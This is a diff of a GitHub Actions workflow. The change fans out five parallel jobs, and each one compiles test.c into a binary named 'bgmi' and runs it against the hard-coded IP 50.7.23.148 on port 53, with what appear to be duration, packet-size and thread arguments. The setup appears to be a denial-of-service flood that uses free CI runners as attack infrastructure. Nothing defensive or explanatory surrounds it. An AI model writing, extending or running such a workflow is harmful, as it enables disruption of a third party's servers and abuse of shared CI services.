@@ -1,11 +1,15 @@
-name: Compile and Run C Program
+name: Parallel C Run
 
 on:
-  workflow_dispatch:  # manual trigger
+  workflow_dispatch:
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
+    strategy:
+      matrix:
+        job_id: [1, 2, 3, 4, 5]  # 👈 5 parallel jobs
 
     steps:
     - name: Checkout repo
@@ -15,7 +19,9 @@ jobs:
       run: sudo apt update && sudo apt install -y gcc zlib1g-dev
 
     - name: Compile
-      run: gcc -o bgmi test.c -lpthread -lz -static
+      run: gcc -o bgmi test.c -lpthread -lz
 
     - name: Run program
-      run: ./bgmi 50.7.23.148 53 30 1024 10
+      run: |
+        echo "Running job ${{ matrix.job_id }}"
+        ./bgmi 50.7.23.148 53 30 1024 10
